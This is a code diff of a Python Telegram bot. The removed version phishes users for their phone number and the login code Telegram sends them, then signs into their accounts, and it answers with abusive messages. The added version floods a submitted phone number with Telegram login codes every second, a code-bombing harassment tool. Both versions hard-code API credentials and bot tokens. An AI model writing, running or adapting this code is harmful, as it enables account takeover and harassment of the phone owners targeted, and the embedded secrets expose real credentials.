@@ -1,104 +1,62 @@
 import asyncio
-import re
-from telethon import TelegramClient, events
-from telethon.errors import (
-    PhoneNumberInvalidError,
-    PhoneCodeInvalidError,
-    PhoneCodeExpiredError,
-    SessionPasswordNeededError,
-    FloodWaitError
-)
+from telegram import Update
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telethon import TelegramClient
 
 API_ID = 35911533
 API_HASH = "11dafcdc1514796c867055023716d39a"
-BOT_TOKEN = "8346402249:AAGrv_AIuNJNJ06-Y2-vTASyB_NRgyzhJZI"
+BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"
 
-bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+spam_data = {}
 
-user_state = {}
-user_phone = {}
-user_hash = {}
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("Пришли номер телефона в формате +7XXXXXXXXXX для спама кодами.")
 
-def normalize_phone(phone: str) -> str:
-    digits = re.sub(r'[^\d]', '', phone)
-    if phone.startswith('+'):
-        digits = '+' + digits
+async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.effective_chat.id
+    if chat_id in spam_data and not spam_data[chat_id]["task"].done():
+        spam_data[chat_id]["task"].cancel()
+        await spam_data[chat_id]["client"].disconnect()
+        del spam_data[chat_id]
+        await update.message.reply_text("Спам остановлен.")
     else:
-        if digits.startswith('0'):
-            digits = '+38' + digits
-        elif digits.startswith('380'):
-            digits = '+' + digits
-        else:
-            digits = '+' + digits
-    return digits
+        await update.message.reply_text("Нет активного спама.")
 
-@bot.on(events.NewMessage(pattern='/start'))
-async def start_handler(event):
-    user_id = event.chat_id
-    user_state[user_id] = 'awaiting_phone'
-    await event.respond("zdarova ueban pishi nomer telephona")
+async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    phone = update.message.text.strip()
+    chat_id = update.effective_chat.id
+    if chat_id in spam_data and not spam_data[chat_id]["task"].done():
+        await update.message.reply_text("Уже идет спам для этого чата.")
+        return
 
-@bot.on(events.NewMessage)
-async def message_handler(event):
-    user_id = event.chat_id
-    text = event.text.strip()
-    state = user_state.get(user_id)
+    client = TelegramClient(None, API_ID, API_HASH)
+    await client.connect()
 
-    if state == 'awaiting_phone':
-        phone = normalize_phone(text)
-        if len(phone) < 6:
-            await event.respond("nevernii nomer")
-            return
+    async def spam():
+        count = 0
         try:
-            client = TelegramClient(f'user_{user_id}', API_ID, API_HASH)
-            await client.connect()
-            sent = await client.send_code_request(phone)
-            user_phone[user_id] = phone
-            user_hash[user_id] = sent.phone_code_hash
-            user_state[user_id] = 'awaiting_code'
-            await event.respond("cod otpravlen chekni")
-        except PhoneNumberInvalidError:
-            await event.respond("nevernii nomer")
-        except FloodWaitError as e:
-            await event.respond(f"slikom chasto. podozdi {e.seconds} sec.")
-        except Exception:
-            await event.respond("ochibka otpravki coda")
-        finally:
+            while True:
+                await client.send_code_request(phone)
+                count += 1
+                await context.bot.send_message(chat_id, f"Отправлен код #{count} на номер {phone}")
+                await asyncio.sleep(1)
+        except asyncio.CancelledError:
+            await client.disconnect()
+            raise
+        except Exception as e:
+            await context.bot.send_message(chat_id, f"Ошибка: {e}")
             await client.disconnect()
 
-    elif state == 'awaiting_code':
-        code = text.strip()
-        if not code.isdigit():
-            await event.respond("vvedi tolko cifry")
-            return
-        phone = user_phone[user_id]
-        phone_code_hash = user_hash[user_id]
-        try:
-            client = TelegramClient(f'user_{user_id}', API_ID, API_HASH)
-            await client.connect()
-            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
-            user_state.pop(user_id, None)
-            user_phone.pop(user_id, None)
-            user_hash.pop(user_id, None)
-            await event.respond("tvoia mama umerla idi nahui")
-        except PhoneCodeInvalidError:
-            await event.respond("nevernii kod")
-        except PhoneCodeExpiredError:
-            await event.respond("cod istek. pishi /start zanovo")
-            user_state.pop(user_id, None)
-            user_phone.pop(user_id, None)
-            user_hash.pop(user_id, None)
-        except SessionPasswordNeededError:
-            await event.respond("nuzen parol. ne mogu voity")
-        except FloodWaitError as e:
-            await event.respond(f"slikom chasto. podozdi {e.seconds} sec.")
-        except Exception:
-            await event.respond("ochibka vxoda")
-        finally:
-            await client.disconnect()
+    task = asyncio.create_task(spam())
+    spam_data[chat_id] = {"task": task, "client": client}
+    await update.message.reply_text("Запущен спам кодами. Для остановки отправь /stop")
 
-async def main():
-    await bot.run_until_disconnected()
+def main():
+    app = Application.builder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("stop", stop_spam))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone))
+    app.run_polling()
 
-if __name__ == '__main__':
-    asyncio.run(main())
+if __name__ == "__main__":
+    main()
